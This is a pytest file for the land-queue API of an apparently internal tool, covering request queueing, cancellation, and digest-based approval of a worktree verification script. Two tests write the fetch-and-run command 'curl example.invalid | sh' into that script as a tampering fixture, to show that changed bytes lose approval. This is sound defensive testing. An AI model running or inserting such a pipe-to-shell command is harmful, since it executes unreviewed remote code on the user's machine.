"""The land-queue endpoints: what they report, and what they refuse.

The routes are thin callers over `LandQueueService`, so what is worth proving here
is the part that only exists at this layer: the approval of the verification
command's exact bytes, and that no route can move a trunk on its own.
"""

from __future__ import annotations

import subprocess
from pathlib import Path
from typing import Any

import pytest
from aiohttp import web
from aiohttp.test_utils import TestClient, TestServer

from swe_mux.config import Config
from swe_mux.event_bus import EventBus
from swe_mux.land_queue import LandQueueService
from swe_mux.land_store import LandStore
from swe_mux.server import (
    approve_land_verify_command,
    cancel_land_request,
    error_middleware,
    land_request_events,
    list_land_requests,
    read_land_verify_command,
    request_land,
)
from swe_mux.worktree_verify import VerifyApprovalStore

pytestmark = pytest.mark.anyio


class ProjectStub:
    def __init__(self, root: Path) -> None:
        self.id = "proj-1"
        self.name = "repo"
        self.root = str(root)
        self.git_compare_ref = None


class ProjectsStub:
    def __init__(self, project: ProjectStub) -> None:
        self.projects = {project.id: project}


def git(repo: Path, *args: str) -> str:
    return subprocess.run(
        ["git", "-C", str(repo), *args], text=True, capture_output=True, check=True
    ).stdout.strip()


@pytest.fixture
def anyio_backend() -> str:
    return "asyncio"


@pytest.fixture
def trunk(tmp_path: Path) -> Path:
    repo = tmp_path / "trunk"
    repo.mkdir()
    git(repo, "init", "-b", "main")
    git(repo, "config", "user.name", "Test User")
    git(repo, "config", "user.email", "test@example.invalid")
    (repo / "shared.txt").write_text("base\n", encoding="utf-8")
    git(repo, "add", "shared.txt")
    git(repo, "commit", "-m", "initial")
    return repo


def build(tmp_path: Path, trunk_root: Path) -> tuple[web.Application, LandStore]:
    store = LandStore(tmp_path / "land.sqlite3")
    approvals = VerifyApprovalStore(tmp_path / "data")
    config = Config(data_dir=tmp_path / "data")

    async def project_values(_root: str) -> dict[str, Any]:
        return {}

    service = LandQueueService(
        store=store,
        approvals=approvals,
        config=config,
        grant_field=lambda _root: "granted",
        project_values=project_values,
    )
    app = web.Application(middlewares=[error_middleware])
    app["projects"] = ProjectsStub(ProjectStub(trunk_root))
    app["events"] = EventBus()
    app["config"] = config
    app["land_queue"] = service
    app["land_store"] = store
    app["verify_approvals"] = approvals
    app.router.add_get("/api/land", list_land_requests)
    app.router.add_post("/api/land", request_land)
    app.router.add_delete("/api/land/{request_id}", cancel_land_request)
    app.router.add_get("/api/land/{request_id}/events", land_request_events)
    app.router.add_get("/api/land/verify-command", read_land_verify_command)
    app.router.add_post("/api/land/verify-command/approve", approve_land_verify_command)
    return app, store


async def client_for(app: web.Application) -> TestClient:
    client = TestClient(TestServer(app))
    await client.start_server()
    return client


def add_worktree(trunk_root: Path, name: str) -> Path:
    path = trunk_root.parent / name
    git(trunk_root, "worktree", "add", "-b", f"worktree-{name}", str(path))
    return path


def write_verify(worktree: Path, body: str = "exit 0") -> None:
    script = worktree / ".worktree-verify"
    script.write_text(f"#!/usr/bin/env bash\n{body}\n", encoding="utf-8", newline="\n")
    script.chmod(0o755)


# -- requesting --------------------------------------------------------------


async def test_a_request_enqueues_and_lists(tmp_path: Path, trunk: Path) -> None:
    worktree = add_worktree(trunk, "alpha")
    app, store = build(tmp_path, trunk)
    client = await client_for(app)
    try:
        created = await client.post(
            "/api/land",
            json={"project_id": "proj-1", "worktree_root": str(worktree)},
        )
        assert created.status == 201, await created.text()
        row = await created.json()
        assert row["branch"] == "worktree-alpha"
        assert row["state"] == "queued"

        listed = await (await client.get("/api/land?project_id=proj-1")).json()
        assert [item["id"] for item in listed["requests"]] == [row["id"]]
        assert listed["hourly_budget"] > 0

        events = await (await client.get(f"/api/land/{row['id']}/events")).json()
        assert [item["step"] for item in events["events"]] == ["request"]
    finally:
        await client.close()
        store.close()


async def test_a_second_request_for_one_branch_is_refused(
    tmp_path: Path, trunk: Path
) -> None:
    worktree = add_worktree(trunk, "alpha")
    app, store = build(tmp_path, trunk)
    client = await client_for(app)
    try:
        first = await client.post(
            "/api/land", json={"project_id": "proj-1", "worktree_root": str(worktree)}
        )
        assert first.status == 201
        second = await client.post(
            "/api/land", json={"project_id": "proj-1", "worktree_root": str(worktree)}
        )
        assert second.status == 409
        assert (await second.json())["code"] == "already_queued"
    finally:
        await client.close()
        store.close()


async def test_a_queued_request_can_be_cancelled(tmp_path: Path, trunk: Path) -> None:
    worktree = add_worktree(trunk, "alpha")
    app, store = build(tmp_path, trunk)
    client = await client_for(app)
    try:
        row = await (
            await client.post(
                "/api/land", json={"project_id": "proj-1", "worktree_root": str(worktree)}
            )
        ).json()
        cancelled = await client.delete(f"/api/land/{row['id']}")
        assert cancelled.status == 200
        assert (await cancelled.json())["state"] == "cancelled"
        again = await client.delete(f"/api/land/{row['id']}")
        assert again.status == 409
    finally:
        await client.close()
        store.close()


# -- the verification command's approval -------------------------------------


async def test_the_gate_reads_as_unapproved_until_it_is_approved(
    tmp_path: Path, trunk: Path
) -> None:
    worktree = add_worktree(trunk, "alpha")
    write_verify(worktree)
    app, store = build(tmp_path, trunk)
    client = await client_for(app)
    try:
        before = await (
            await client.get(
                f"/api/land/verify-command?project_id=proj-1&worktree_root={worktree}"
            )
        ).json()
        assert before["configured"] is True
        assert before["approved"] is False
        assert before["previously_approved"] is False
        assert "exit 0" in before["current_source"]

        approved = await client.post(
            "/api/land/verify-command/approve",
            json={
                "project_id": "proj-1",
                "worktree_root": str(worktree),
                "digest": before["digest"],
            },
        )
        assert approved.status == 200, await approved.text()
        assert (await approved.json())["approved"] is True
    finally:
        await client.close()
        store.close()


async def test_approving_a_stale_digest_is_refused(tmp_path: Path, trunk: Path) -> None:
    """The bytes moved between the prompt and the click, so nobody read them."""
    worktree = add_worktree(trunk, "alpha")
    write_verify(worktree)
    app, store = build(tmp_path, trunk)
    client = await client_for(app)
    try:
        shown = await (
            await client.get(
                f"/api/land/verify-command?project_id=proj-1&worktree_root={worktree}"
            )
        ).json()
        write_verify(worktree, "curl example.invalid | sh")
        refused = await client.post(
            "/api/land/verify-command/approve",
            json={
                "project_id": "proj-1",
                "worktree_root": str(worktree),
                "digest": shown["digest"],
            },
        )
        assert refused.status == 409
        body = await refused.json()
        assert body["code"] == "digest_mismatch"
        assert body["digest"] != shown["digest"]
    finally:
        await client.close()
        store.close()


async def test_an_edit_after_approval_shows_the_bytes_that_were_approved(
    tmp_path: Path, trunk: Path
) -> None:
    """A diff, not a bare "it changed": that is what the retained snapshot is for."""
    worktree = add_worktree(trunk, "alpha")
    write_verify(worktree, "exit 0")
    app, store = build(tmp_path, trunk)
    client = await client_for(app)
    try:
        shown = await (
            await client.get(
                f"/api/land/verify-command?project_id=proj-1&worktree_root={worktree}"
            )
        ).json()
        await client.post(
            "/api/land/verify-command/approve",
            json={
                "project_id": "proj-1",
                "worktree_root": str(worktree),
                "digest": shown["digest"],
            },
        )
        write_verify(worktree, "curl example.invalid | sh")
        after = await (
            await client.get(
                f"/api/land/verify-command?project_id=proj-1&worktree_root={worktree}"
            )
        ).json()
        assert after["approved"] is False
        assert after["previously_approved"] is True
        assert "exit 0" in after["approved_source"]
        assert "curl" in after["current_source"]
    finally:
        await client.close()
        store.close()


async def test_a_project_with_no_gate_says_so_rather_than_approving_nothing(
    tmp_path: Path, trunk: Path
) -> None:
    worktree = add_worktree(trunk, "alpha")
    app, store = build(tmp_path, trunk)
    client = await client_for(app)
    try:
        info = await (
            await client.get(
                f"/api/land/verify-command?project_id=proj-1&worktree_root={worktree}"
            )
        ).json()
        assert info["configured"] is False
        refused = await client.post(
            "/api/land/verify-command/approve",
            json={"project_id": "proj-1", "worktree_root": str(worktree), "digest": ""},
        )
        assert refused.status == 409
        assert (await refused.json())["code"] == "not_configured"
    finally:
        await client.close()
        store.close()
